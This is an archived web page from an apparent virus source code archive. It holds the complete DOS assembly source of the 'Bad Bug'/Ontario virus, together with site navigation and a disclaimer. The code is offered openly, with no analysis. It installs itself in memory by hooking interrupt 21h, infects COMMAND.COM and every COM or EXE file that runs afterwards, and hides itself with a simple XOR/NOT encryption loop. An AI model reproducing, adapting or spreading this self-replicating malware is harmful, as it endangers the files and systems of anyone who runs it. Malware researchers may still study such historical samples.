<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: ontario0_asm</title>
<meta name="KEYWORDS" content="ontario0.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for ontario0.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="oblit_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/oblit_pas.php">oblit_pas</a><br>
<a href="odst1028_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/odst1028_pas.php">odst1028_pas</a><br>
<a href="offspr05_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr05_asm.php">offspr05_asm</a><br>
<a href="offspr07_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr07_asm.php">offspr07_asm</a><br>
<a href="offspr81_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr81_asm.php">offspr81_asm</a><br>
<a href="offspr82_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr82_asm.php">offspr82_asm</a><br>
<a href="offspr89_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/offspr89_asm.php">offspr89_asm</a><br>
<a href="olo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/olo_asm.php">olo_asm</a><br>
<a href="omega_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/omega_asm.php">omega_asm</a><br>
<a href="one-13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/one-13_asm.php">one-13_asm</a><br>
<a href="onkelz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/onkelz_asm.php">onkelz_asm</a><br>
<a href="ontar512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ontar512_asm.php">ontar512_asm</a><br>
<a href="ontario0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ontario0_asm.php">ontario0_asm</a><br>
<a href="ontario3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ontario3_asm.php">ontario3_asm</a><br>
<a href="ontario_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ontario_asm.php">ontario_asm</a><br>
<a href="orgasm_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orgasm_pas.php">orgasm_pas</a><br>
<a href="oropax___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/oropax___asm.php">oropax___asm</a><br>
<a href="oropax__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/oropax__asm.php">oropax__asm</a><br>
<a href="oropax_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/oropax_asm.php">oropax_asm</a><br>
<a href="orsam1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam1_asm.php">orsam1_asm</a><br>
<a href="orsam2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam2_asm.php">orsam2_asm</a><br>
<a href="orsam3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam3_asm.php">orsam3_asm</a><br>
<a href="orsam__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam__asm.php">orsam__asm</a><br>
<a href="orsam_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/orsam_asm.php">orsam_asm</a><br>
<a href="osp-07s_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/osp-07s_asm.php">osp-07s_asm</a><br>
<a href="ospring__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ospring__asm.php">ospring__asm</a><br>
<a href="ospring_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ospring_asm.php">ospring_asm</a><br>
<a href="otto_415_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/otto_415_asm.php">otto_415_asm</a><br>
<a href="otto-415_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/otto-415_asm.php">otto-415_asm</a><br>
<a href="outland_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/outland_asm.php">outland_asm</a><br>
<a href="ow_27_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_27_asm.php">ow_27_asm</a><br>
<a href="ow_27b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_27b_asm.php">ow_27b_asm</a><br>
<a href="ow_28_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_28_asm.php">ow_28_asm</a><br>
<a href="ow_28b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_28b_asm.php">ow_28b_asm</a><br>
<a href="ow_30_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_30_asm.php">ow_30_asm</a><br>
<a href="ow-30_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow-30_asm.php">ow-30_asm</a><br>
<a href="ow_32_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_32_asm.php">ow_32_asm</a><br>
<a href="ow_37_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_37_asm.php">ow_37_asm</a><br>
<a href="ow_40_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_40_asm.php">ow_40_asm</a><br>
<a href="ow_42_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_42_asm.php">ow_42_asm</a><br>
<a href="ow-42_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow-42_asm.php">ow-42_asm</a><br>
<a href="ow_42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_42b_asm.php">ow_42b_asm</a><br>
<a href="ow_44_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_44_asm.php">ow_44_asm</a><br>
<a href="ow_64_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_64_asm.php">ow_64_asm</a><br>
<a href="ow_66_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/ow_66_asm.php">ow_66_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>


comment	*

           Older version of Bad Bug, also known as Ontario virus.
                        --> Written by Death Angel <--
	-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
	This virus first puts itself in memory, if not already.  Infects the
	C:\COMMAND.COM file, then infects other files as they are loaded.
	It appends itself onto COM and EXE files.

	Identification method:
	======================
	Checking if already in memory - INT 21/AH=FF, returns AX=0
	Checking if COM is infected - 4th byte in file "V"
	Checking if EXE is infected - Instruction Pointer is at 1

	*

LOC_21		EQU	21H*4
REAL_SIZE	equ	offset EOF

CODE	SEGMENT	PARA PUBLIC 'CODE'
	ASSUME CS:CODE, DS:CODE
	ORG 0h

VBUG	PROC	FAR
	nop
	call	MASTER_UNCODE
VB01:
	call	VB00
VB00:
	pop	bp
	sub	BP, +7
	mov	ax, -1
	int	21h
	or	ah, ah
	je	GO_PROG

	push	ds
	xor	ax, ax
	mov	ds, ax					;BIOS data area
	sub	word ptr ds:[0413H], 2
	lds	bx, ds:[LOC_21]
	mov	word ptr cs:[BP]+offset OLD_21, bx	
	mov	word ptr cs:[BP]+offset OLD_21+2, ds ;Get interrupt 21h vector
	mov	bx, es
	dec	bx
	mov	ds, bx
	sub	word ptr ds:[0003H], 2048/16	;Paragraph size
	mov	ax, ds:[0012H]			;Get high memory segment
	sub	ax, 2048/16			;Make room for ourself
	mov	ds:[0012H], ax			;Save it
	mov	es, ax
	push	cs
	pop	ds
	mov	si, bp			;Put 0000 into SI (if EXE..)
	xor	di, di
	mov	cx, REAL_SIZE+4         ;Plus OLD_21 information!
	cld
	rep	movsb
	mov	ds, cx			;Put zero into DS
	cli				;Disable maskable interrupts
	mov	word ptr ds:LOC_21, offset NEW_21
	mov	word ptr ds:LOC_21+2, ax
	sti				;Enable interrupts
	mov	ax, 4BFFH		;Infect COMMAND.COM file!
	int	21h
	pop	ds
	push	ds
	pop	es

GO_PROG:				;Check if EXE or COM program?
	or	bp, bp			;Are we an EXE file?
	je	RUN_EXE

RUN_COM:				;Run this infected .COM file
	lea	si, [BP]+offset RUN_PROG
	mov	di, 100H
	push	di
	cld
	movsw	
	movsw
DUMB_ROUTINE PROC NEAR
	ret				;Do a local return
DUMB_ROUTINE ENDP

RUN_EXE:
	mov	ax, es			;Get PSP segment
	add	cs:word ptr RUN_PROG+2, ax	;Reallocate entry segment
					
	db	0EAh			;JMP 0000:0000

RUN_PROG	db	0B4H, 04CH
		db	0CDH, 021H
NEW_21:
	cmp	ax, -1
	jne	NW00
	inc	ax				;Overflow to 0000
	iret
NW00:
	cmp	ah, 4Bh				;Infect program being executed
	jne	RUN_OLD_21
	cmp	al, 03
	je	RUN_OLD_21
	cmp	al, -1
	jne	RO00
	push	cs
	pop	ds
	mov	dx, offset COMMAND_FILE
	call	INFECT_PROGRAM
	IRET
RO00:
	call	INFECT_PROGRAM

RUN_OLD_21:
	jmp	dword ptr cs:OLD_21	;Do original interrupt

INFECT_PROGRAM	PROC	NEAR
;
;When entering a normal Int 21/AH=4BH
;DS:DX -> Ptr to filename
;ES:BX -> Ptr to Parm Block
;AL    -> 0 - Load/Run, 3 - Overlay
;
	push	es
	push	ds
	push	dx
	push	cx
	push	bx
	push	ax
;	push	si
;	push	di

	mov	ax, 4300H		;Get file attribute
	call	DO_21
	jb	NO_CLOSE
	test	cl, 00000001b
	je	VB04
	and	cl, 11111110b		;Turn off bit 0 (so you can write)
	mov	ax, 4301H		;Set file attribute
	call	DO_21
	jb	NO_CLOSE
	  
VB04:
	mov	ax, 3D02h		;Open file for reading & writing
	call	DO_21
VB05:
	JNB	VB06
NO_CLOSE:
	JMP	END_21
VB06:
	
	mov	bx, ax			;Put new handle into BX
	push	cs
	pop	ds

	mov	ax, 5700H		;Get file date
	call	DO_21
	mov	ds:FILE_TIME, cx
	mov	ds:FILE_DATE, dx

	mov	dx, offset TMP_HEADER	;Load in COM/EXE ? file header
	mov	cx, 1BH			;Size of header (for EXE, it doesn't
					;matter the extra bytes loaded for
					;COM files.
	mov	ah, 3Fh			;Read from file
	call	DO_21
VB10:
	jb	CLOSE_END

	cmp	word ptr ds:SIGN, 'ZM'		;Is this an EXE file? (MZ)
	je	INFECT_EXE

INFECT_COM:
	mov	al, byte ptr SIGN+1
	cmp	al, byte ptr SIGN+3
	je	CLOSE_END

	xor	dx, dx
	xor	cx, cx
	mov	ax, 4202H			;Seek from EOF
	call	DO_21
VB15:
	jb	CLOSE_END

;Returns DX:AX number of bytes seeked (Size of file)

	cmp	ax, 0E000H			;Check file size
	ja	CLOSE_END
	push	ax
	mov	ax, ds:word ptr [SIGN+0]
	mov	word ptr ds:RUN_PROG+0, ax
	mov	ax, ds:word ptr [SIGN+2]
	mov	word ptr ds:RUN_PROG+2, ax
	pop	ax
	sub	ax, 3				;Calculate jmp to End of file
	mov	byte ptr ds:SIGN+0, 0E9H	;JMP FAR
	mov	word ptr ds:SIGN+1, ax
	mov	byte ptr ds:SIGN+3, al		;Identification code

	jmp	FINISH_INFECT

;From here in, both EXE & COM files are infected the same
;The virus is written, seek to start of file, and re-write the Header

INFECT_EXE:
	cmp	word ptr ds:START_IP, 1
	jne	VB19
VB18:
CLOSE_END:
	jmp	END_INFECT
VB19:
	mov	ax, ds:[FILE_SIZE]		;Get file size
	mov	cx, 200H
	mul	cx				;Convert to bytes offset

;If filesize, if bigger then 64K, the overflow is put into DX

	push	ax
	push	dx
	mov	cl, 04h
	ror	dx, cl
	shr	ax, cl				;Convert to paragraphs
	add	ax, dx
	sub	ax, ds:SIZE_HEADER
	PUSH	AX
	mov	ax, ds:START_IP
	mov 	word ptr ds:RUN_PROG, ax
	mov	ax, ds:START_CS
	add	ax, 0010H
	mov	word ptr ds:RUN_PROG+2, ax
	POP	AX
	mov	word ptr ds:START_CS, ax
	mov	word ptr ds:START_IP, +1
	inc	word ptr ds:FILE_SIZE

	pop	cx
	pop	dx
	mov	ax, 4200H			;Goto end of file
	call	DO_21
VB20:
	jb	VB25

FINISH_INFECT:
	xor	ds:byte ptr [DC00]+1, 08h	;Toggle NEG/NOT
	
	xor	ax, ax
	mov	ds, ax
	mov	AL, byte ptr ds:[46CH]	;Lowest byte of timer count
	push	cs
	pop	ds
	push	cs
	pop	es
	mov	ds:[CODE_BYTE], AL	;Put high byte of file seek
	xor	si, si
	mov	di, offset REAL_EOF
	push	di			;Push pointer
	mov	cx, offset EOF
	cld
	rep	movsb
	mov	si, offset REAL_EOF+04H	;REAL_EOF+VB01
	call	DECODE
	pop	dx			;Restore pointer
	mov	cx, REAL_SIZE
	mov	ah, 40h
	call	DO_21
	JB	END_INFECT

	xor	cx, cx
	xor	dx, dx			;Distance to seek into file
	mov	ax, 4200h		;Seek from start of file
	call	DO_21
	jb	END_INFECT

	mov	dx, offset TMP_HEADER	;Ptr to New modified header
	mov	cx, 1BH			;Size of header
	mov	ah, 40h			;Write to file
	call	DO_21

VB25:
END_INFECT:
	mov	dx, ds:FILE_DATE
	mov	cx, ds:FILE_TIME
	mov	ax, 5701h		;Set file date/time
	call	DO_21

CLOSE_FILE:
	mov	ah, 3Eh			;Close the file
	call	DO_21
END_21:	
;	pop	di
;	pop	si
	pop	ax
	pop	bx
	pop	cx
	pop	dx
	pop	ds
	pop	es
	RET

DO_21:
	pushf
	call	dword ptr cs:OLD_21
	ret

COMMAND_FILE	DB	'C:\COMMAND.COM',0

MASTER_DECODE:
CODE_BYTE	DB	80H

MASTER_UNCODE:
	POP	SI
	PUSH	SI
	MOV	AL, BYTE PTR CS:[SI+CODE_BYTE-OFFSET VB01]
DECODE:
	MOV	CX, OFFSET MASTER_DECODE-OFFSET VB01
DC00:
	NOT	AL
	XOR	CS:BYTE PTR [SI], AL
	INC	SI
	LOOP	DC00
	RET

INFECT_PROGRAM	ENDP

EOF:

OLD_21		DD	?

FILE_TIME	DW	?
FILE_DATE	DW	?

TMP_HEADER:
SIGN		DW	?
LEN_IMAGE_MOD	DW	?
FILE_SIZE	DW	?		;In 512-increments
NUM_REAL	DW	?
SIZE_HEADER	DW	?
MIN_ABOVE	DW	?
MAX_ABOVE	DW	?
STACK_SS	DW	?
STACK_SP	DW	?
CHECKSUM	DW	?
START_IP	DW	?
START_CS	DW	?
DISPLAY_REAL	DW	?
OVERLAY_NUM	DW	?

REAL_EOF:

VBUG	ENDP

CODE	ENDS
	END	VBUG


</textarea></td></tr></table></body></html>
